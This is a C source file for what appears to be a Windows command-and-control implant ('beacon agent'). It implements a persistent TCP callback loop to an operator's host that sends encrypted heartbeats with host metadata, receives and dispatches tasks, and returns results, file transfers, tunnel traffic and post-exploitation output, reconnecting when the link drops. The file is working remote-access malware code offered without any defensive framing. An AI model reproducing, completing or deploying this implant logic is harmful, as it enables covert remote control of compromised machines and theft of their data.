#include "beacon_agent_internal.h"

#if defined(BEACON_EXTERNAL_TCP_BUILD)

#define TCP_EXTERNAL_PAYLOAD_MAGIC 0x54435031u /* "TCP1" */
#define TCP_EXTERNAL_PAYLOAD_VERSION 1u

/* 构建 TCP external 心跳明文：heartbeat.beacon_info = TCP1 + metadata + optional result */
static ByteBuf BuildTcpExternalHeartbeatPlain(const BeaconContext* ctx, const ByteBuf* body)
{
    ByteBuf meta;
    ByteBuf tcp_payload;
    ByteBuf heartbeat;

    meta = AgentBuildMetadataPayload(ctx);
    BbInit(&tcp_payload);

    BbU32(&tcp_payload, TCP_EXTERNAL_PAYLOAD_MAGIC);
    BbU32(&tcp_payload, TCP_EXTERNAL_PAYLOAD_VERSION);
    BbBytes(&tcp_payload, meta.data, meta.len);
    if (body && body->len) {
        BbBytes(&tcp_payload, body->data, body->len);
    }

    heartbeat = PacketPackHeartbeat(ctx->beacon_id, ctx->session_key,
                                    sizeof(ctx->session_key), &tcp_payload);

    BbFree(&tcp_payload);
    BbFree(&meta);
    return heartbeat;
}

/* 构建并加密 TCP external 心跳帧 */
static INT BuildTcpExternalEncryptedHeartbeat(BeaconContext* ctx, const ByteBuf* body, ByteBuf* encrypted)
{
    ByteBuf plain = BuildTcpExternalHeartbeatPlain(ctx, body);
    INT ok = CryptoEncryptHeartbeat(ctx->profile.encrypt_key, &plain, encrypted);

    BbFree(&plain);
    return ok;
}

/* 加密并通过 TCP external 长连接发送所有出站数据包 */
static INT FlushOutboxTcpExternal(BeaconContext* ctx, TcpExternalSession* session)
{
    OutboxNode* list = OutboxDrain(&ctx->outbox);
    OutboxNode* cur = list;

    while (cur) {
        ByteBuf encrypted_result;
        ByteBuf heartbeat;
        ByteBuf response;

        if (!CryptoEncryptResult(ctx->session_key, sizeof(ctx->session_key), &cur->packet, &encrypted_result)) {
            OutboxPushFrontList(&ctx->outbox, cur);
            return 0;
        }

        if (!BuildTcpExternalEncryptedHeartbeat(ctx, &encrypted_result, &heartbeat)) {
            BbFree(&encrypted_result);
            OutboxPushFrontList(&ctx->outbox, cur);
            return 0;
        }
        BbFree(&encrypted_result);

        if (!TransportTcpExternalExchange(session, &heartbeat, &response)) {
            BbFree(&heartbeat);
            OutboxPushFrontList(&ctx->outbox, cur);
            return 0;
        }
        BbFree(&heartbeat);

        AgentDispatchTasks(ctx, &response);
        BbFree(&response);

        {
            OutboxNode* done = cur;
            cur = cur->next;
            OutboxFreeNode(done);
        }
    }

    return 1;
}

static VOID TcpExternalReconnectDelay(Agent* agent)
{
    DWORD wait_ms;

    if (!agent || !agent->ctx.active) return;

    wait_ms = (DWORD)(agent->ctx.profile.tcp_external.reconnect_time_ms > 0 ?
        agent->ctx.profile.tcp_external.reconnect_time_ms : 1000);

    if (agent->ctx.runtime.wake_event) {
        WaitForSingleObject(agent->ctx.runtime.wake_event, wait_ms);
    } else {
        Sleep(wait_ms);
    }
}

/* TCP external 主循环：保持一条 TCP 长连接，周期性发送心跳并回传结果 */
INT AgentRunExternalTcp(Agent* agent)
{
    BeaconContext* ctx = &agent->ctx;
    TcpExternalSession session;
    INT failures = 0;
    INT max_failures = ctx->profile.tcp_external.reconnect_count >= 0 ?
        ctx->profile.tcp_external.reconnect_count : 0;

    TransportTcpExternalInit(&session);

    while (ctx->active && InterlockedCompareExchange(&agent->stop, 0, 0) == 0) {
        ByteBuf heartbeat;
        ByteBuf response;
        INT connected;

        if (session.sock == INVALID_SOCKET) {
            connected = TransportTcpExternalConnect(&ctx->profile, &session);
            if (!connected) {
                if (failures++ >= max_failures) {
                    break;
                }
                TcpExternalReconnectDelay(agent);
                continue;
            }
            failures = 0;
            DebugPrintf("[*] TCP external connected to %s:%d\n",
                        ctx->profile.tcp_external.callback_host,
                        ctx->profile.tcp_external.callback_port);
        }

        BeaconSleep(ctx);

        if (!BuildTcpExternalEncryptedHeartbeat(ctx, NULL, &heartbeat)) {
            TransportTcpExternalClose(&session);
            continue;
        }

        if (!TransportTcpExternalExchange(&session, &heartbeat, &response)) {
            BbFree(&heartbeat);
            TransportTcpExternalClose(&session);
            if (failures++ >= max_failures) {
                break;
            }
            TcpExternalReconnectDelay(agent);
            continue;
        }
        BbFree(&heartbeat);
        failures = 0;

        AgentDispatchTasks(ctx, &response);
        BbFree(&response);

        AgentFlushTransfers(ctx);
        AgentFlushTunnels(ctx);
        AgentFlushCascade(ctx);
        AgentFlushPostEx(ctx);
        if (!FlushOutboxTcpExternal(ctx, &session)) {
            TransportTcpExternalClose(&session);
            if (failures++ >= max_failures) {
                break;
            }
            TcpExternalReconnectDelay(agent);
        }
    }

    TransportTcpExternalClose(&session);
    return 0;
}

#endif
